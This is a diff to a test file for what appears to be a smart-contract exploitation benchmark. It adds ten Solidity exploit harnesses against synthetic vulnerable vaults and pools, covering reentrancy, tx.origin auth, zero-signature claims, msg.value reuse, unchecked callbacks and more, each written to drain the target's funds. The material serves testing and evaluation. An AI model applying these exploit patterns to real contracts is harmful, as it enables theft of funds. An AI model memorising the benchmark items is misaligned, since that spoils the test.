@@ -77,7 +77,7 @@ def test_train_and_test_splits_have_zero_overlap():
     train_entries = _flat_targets(DEFAULT_TRAIN_DATASET_PATH)
 
     assert len(test_entries) == 16
-    assert 8 <= len(train_entries) <= 10
+    assert len(train_entries) == 20
     assert len(TRUSTED_HARNESS_CONTRACTS) == 16
     assert len(TRAIN_TRUSTED_HARNESS_CONTRACTS) == len(train_entries)
 
@@ -682,6 +682,159 @@ contract ExploitModule {
     receive() external payable {}
 }
 """,
+    "TrainSlippageVault": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {TrainSlippageVault} from "../src/TrainSlippageVault.sol";
+contract ExploitModule {
+    TrainSlippageVault public target;
+    constructor(address _t) payable { target = TrainSlippageVault(payable(_t)); }
+    function runExploit() external payable {
+        target.swapEthForTokens{value: msg.value}(0);
+    }
+    receive() external payable {}
+}
+""",
+    "TrainDelegateProxy": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {TrainDelegateProxy} from "../src/TrainDelegateProxy.sol";
+contract ExploitModule {
+    TrainDelegateProxy public target;
+    constructor(address _t) payable { target = TrainDelegateProxy(payable(_t)); }
+    function runExploit() external payable {
+        target.execute(abi.encodeWithSignature("setValue(uint256)", uint256(uint160(address(this)))));
+        target.withdrawAll(payable(address(this)));
+    }
+    receive() external payable {}
+}
+""",
+    "TrainCrossFuncVault": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {TrainCrossFuncVault} from "../src/TrainCrossFuncVault.sol";
+contract CrossHelper {
+    TrainCrossFuncVault public target;
+    constructor(TrainCrossFuncVault _t) { target = _t; }
+    function drain() external { target.withdraw(); }
+    receive() external payable {}
+}
+contract ExploitModule {
+    TrainCrossFuncVault public target;
+    CrossHelper public helper;
+    bool private reentered;
+    uint256 private depositAmt;
+    constructor(address _t) payable {
+        target = TrainCrossFuncVault(payable(_t));
+        helper = new CrossHelper(target);
+    }
+    function runExploit() external payable {
+        depositAmt = msg.value;
+        target.deposit{value: msg.value}();
+        target.withdraw();
+        helper.drain();
+    }
+    receive() external payable {
+        if (!reentered) {
+            reentered = true;
+            target.transferBalance(address(helper), depositAmt);
+        }
+    }
+}
+""",
+    "TrainTxOriginWallet": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {TrainTxOriginWallet} from "../src/TrainTxOriginWallet.sol";
+contract ExploitModule {
+    TrainTxOriginWallet public target;
+    constructor(address _t) payable { target = TrainTxOriginWallet(payable(_t)); }
+    function runExploit() external payable {
+        target.transferTo(payable(address(this)), address(target).balance);
+    }
+    receive() external payable {}
+}
+""",
+    "TrainTruncatedDividend": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {TrainTruncatedDividend} from "../src/TrainTruncatedDividend.sol";
+contract ExploitModule {
+    TrainTruncatedDividend public target;
+    constructor(address _t) payable { target = TrainTruncatedDividend(payable(_t)); }
+    function runExploit() external payable {
+        target.withdraw(4294967296 * 1e9);
+    }
+    receive() external payable {}
+}
+""",
+    "TrainZeroSigVault": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {TrainZeroSigVault} from "../src/TrainZeroSigVault.sol";
+contract ExploitModule {
+    TrainZeroSigVault public target;
+    constructor(address _t) payable { target = TrainZeroSigVault(payable(_t)); }
+    function runExploit() external payable {
+        target.claim(payable(address(this)), address(target).balance, 1, 0, bytes32(0), bytes32(0));
+    }
+    receive() external payable {}
+}
+""",
+    "TrainMsgValueBatch": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {TrainMsgValueBatch} from "../src/TrainMsgValueBatch.sol";
+contract ExploitModule {
+    TrainMsgValueBatch public target;
+    constructor(address _t) payable { target = TrainMsgValueBatch(payable(_t)); }
+    function runExploit() external payable {
+        address[] memory recipients = new address[](3);
+        recipients[0] = address(this);
+        recipients[1] = address(this);
+        recipients[2] = address(this);
+        target.batchDeposit{value: msg.value}(recipients);
+        target.withdraw();
+    }
+    receive() external payable {}
+}
+""",
+    "TrainGovernanceQuorum": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {TrainGovernanceQuorum} from "../src/TrainGovernanceQuorum.sol";
+contract ExploitModule {
+    TrainGovernanceQuorum public target;
+    constructor(address _t) payable { target = TrainGovernanceQuorum(payable(_t)); }
+    function runExploit() external payable {
+        target.stake{value: msg.value}();
+        target.executeProposal(payable(address(this)), 10 ether);
+        target.unstake(msg.value);
+    }
+    receive() external payable {}
+}
+""",
+    "TrainCallbackPool": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {TrainCallbackPool} from "../src/TrainCallbackPool.sol";
+contract ExploitModule {
+    TrainCallbackPool public target;
+    constructor(address _t) payable { target = TrainCallbackPool(payable(_t)); }
+    function runExploit() external payable {
+        target.executeWithCallback(
+            address(target),
+            abi.encodeWithSignature("emergencyRelease(address)", address(this))
+        );
+    }
+    receive() external payable {}
+}
+""",
+    "TrainSelfLiquidationPool": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {TrainSelfLiquidationPool} from "../src/TrainSelfLiquidationPool.sol";
+contract ExploitModule {
+    TrainSelfLiquidationPool public target;
+    constructor(address _t) payable { target = TrainSelfLiquidationPool(payable(_t)); }
+    function runExploit() external payable {
+        target.depositCollateral{value: msg.value}();
+        target.borrow((msg.value * 80) / 100);
+        target.liquidate(address(this));
+    }
+    receive() external payable {}
+}
+""",
 }
 
 
@@ -690,9 +843,9 @@ contract ExploitModule {
     reason="Requires real Foundry toolchain (FOUNDRY_CI=true)",
 )
 def test_foundry_train_targets_and_harnesses_e2e():
-    """Compile and execute all 10 train targets against their trusted harnesses in Foundry."""
+    """Compile and execute all 20 train targets against their trusted harnesses in Foundry."""
     train_targets = load_train_targets()
-    assert len(train_targets) == 10
+    assert len(train_targets) == 20
 
     for target in train_targets:
         exploit_payload = ExploitPayload(
